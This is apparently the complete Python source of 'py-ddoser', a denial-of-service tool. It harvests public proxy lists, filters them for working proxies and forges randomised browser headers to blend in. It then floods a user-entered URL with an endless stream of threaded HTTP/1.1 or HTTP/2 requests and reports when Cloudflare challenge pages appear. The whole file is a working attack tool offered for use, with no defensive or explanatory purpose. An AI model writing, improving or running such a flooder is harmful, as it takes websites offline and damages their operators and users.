#!/usr/bin/python3
import threading, requests, urllib3, random, httpx, json, time, sys, os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "1.1.0"
__build__ = "stable"

working = []
iphosts = [
    'https://ipinfo.io/ip',
    'https://ifconfig.io/ip']

def logo():
    os.system("clear")
    print(f"                           __    __ ")
    print(f"    ____  __  __      ____/ /___/ /___  ________  _____")
    print(r"   / __ \/ / / /_____/ __  / __  / __ \/ ___/ _ \/ ___/")
    print(f"  / /_/ / /_/ /_____/ /_/ / /_/ / /_/ (__  )  __/ /")
    print(r" / .___/\__, /      \__,_/\__,_/\____/____/\___/_/")
    print(f"/_/    /____/             by mishakorzik")
    print(f"                            {__version__} {__build__}")
    print(f"")

def version():
    print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking for updates")
    try:
        resp = requests.get("https://raw.githubusercontent.com/mishakorzik/py-ddoser/refs/heads/main/version.txt", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).text.replace(" ", "").replace("\n", "")
        if __version__ == resp:
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m No update found")
        else:
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Available a new version '{get}', update please")
    except:
        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to check for updates")

# headers generator
def generate():
    headers = {}
    user_agent = [
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.", '"Chromium";v="132", "Opera";v="117", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0", None, "macOS"),
        ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
        ("Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; CrOS x86_64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Chrome OS"),
        ("Mozilla/5.0 (X11; CrOS aarch64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Chrome OS"),
        ("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "Windows")
    ]

    ua = random.choice(user_agent)
    headers["User-Agent"] = ua[0]
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate, br, zstd"])
    headers["Accept-Language"] = random.choice(["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CA,fr;q=0.9,en-CA;q=0.8,en;q=0.7", "sv-SE,sv;q=0.9,nb-NO;q=0.8,en-US;q=0.7,en;q=0.6", "zh-CN,zh;q=0.9,en;q=0.8", "en-IN,en;q=0.9,hi;q=0.8,bn;q=0.7", "en-US,en;q=0.9", "en-US,en;q=0.5"])
    headers["Cache-Control"] = "max-age=0"
    if ua[1]:
        headers["Sec-Ch-Ua"] = ua[1]
    headers["Sec-Ch-Ua-Mobile"] = "?0"
    headers["Sec-Ch-Ua-Platform"] = ua[2]
    headers["Sec-Fetch-Dest"] = "document"
    headers["Sec-Fetch-Mode"] = "navigate"
    headers["Sec-Fetch-Site"] = "none"
    headers["Sec-Fetch-User"] = "?1"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["Connection"] = "keep-alive"
    return headers

def check(prx):
    try:
        requests.get(random.choice(iphosts), headers={"User-Agent": "Mozilla/5.0"}, proxies={"https": f"http://{prx}", "http": f"http://{prx}"}, timeout=7).text
        print(f"\033[01;32mFound working proxy: {prx}\033[0m")
        working.append(prx)
    except:
        pass

def checker(prx, proxy):
    if prx == "":
        for proxy in proxy:
            threading.Thread(target=check, args=(proxy, ), daemon=True).start()
            if len(working) >= 30:
                time.sleep(0.01)
    else:
        for proxy in proxy:
            threading.Thread(target=check, args=(proxy, ), daemon=True).start()

# HTTP 1.1
def http_11(url, proxy):
    try:
        text = requests.get(url, proxies={"https": f"http://{proxy}", "http": f"http://{proxy}"}, headers=generate(), timeout=7, verify=False).text
        if ("<title>Just a moment...</title>" in text and "Enable JavaScript and cookies to continue" in text) or ("<title>Attention Required! | Cloudflare</title>" in text):
            print(f"{proxy}: Request sent over \033[01;36mHTTP/1.1\033[0m, size {len(text)} B (\033[01;31mcloudflare\033[0m)")
        else:
            print(f"{proxy}: Request sent over \033[01;36mHTTP/1.1\033[0m, size {len(text)} B")
    except:
        pass

# HTTP 2.0
def http_20(url, proxy):
    try:
        with httpx.Client(http2=True, transport=httpx.HTTPTransport(proxy=f"http://{proxy}"), headers=generate(), timeout=7, verify=False) as client:
            text = client.get(url).text
            if ("<title>Just a moment...</title>" in text and "Enable JavaScript and cookies to continue" in text) or ("<title>Attention Required! | Cloudflare</title>" in text):
                print(f"{proxy}: Request sent over \033[01;36mHTTP/2.0\033[0m, size {len(text)} B (\033[01;31mcloudflare\033[0m)")
            else:
                print(f"{proxy}: Request sent over \033[01;36mHTTP/2.0\033[0m, size {len(text)} B")
    except:
        pass

def main():
    try:
        url = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter target (\033[01;34mex.\033[0m https://example.com):\033[01;34m "))
        if "://" not in url:
            print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Invalid url")
            sys.exit(1)
        ver = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter http version (1.1, 2.0):\033[01;34m "))
        if ver != "1.1" and ver != "2.0":
            print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Invalid http version")
            sys.exit(1)
        prx = str(input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter proxy file ('Enter' to search):\033[01;34m "))
        if prx == "":
            proxy1 = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", headers={"User-Agent": "Mozilla/5.0"}, timeout=10).text.split()
            proxy2 = requests.get("https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt", headers={"User-Agent": "Mozilla/5.0"}, timeout=10).text.split()
            proxy = list(set(proxy1 + proxy2))
            try: proxy.remove("")
            except: pass
            try: proxy.remove("")
            except: pass
            threading.Thread(target=checker, args=(prx, proxy, ), daemon=True).start()
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Found proxies: {len(proxy)}")
            del proxy, proxy1, proxy2
        else:
            file = open(prx, "r")
            proxy = list(set(file.read().split()))
            file.close()
            try: proxy.remove("")
            except: pass
            try: proxy.remove("")
            except: pass
            threading.Thread(target=checker, args=(prx, proxy, ), daemon=True).start()
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Found proxies: {len(proxy)}")
            del proxy

        if prx == "":
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking (≈30 seconds)")
            while True:
                if len(working) >= 30:
                    break
                time.sleep(1)
        else:
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking (≈10 seconds)")
            time.sleep(10)
        print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Attacking")
        while True:
            if ver == "2.0":
                threading.Thread(target=http_20, args=(url, random.choice(working)), daemon=True).start()
            else:
                threading.Thread(target=http_11, args=(url, random.choice(working)), daemon=True).start()
    except KeyboardInterrupt:
        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Exiting")
    except Exception as e:
        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Error: {e}")

if __name__ == "__main__":
    logo()
    version()
    main()
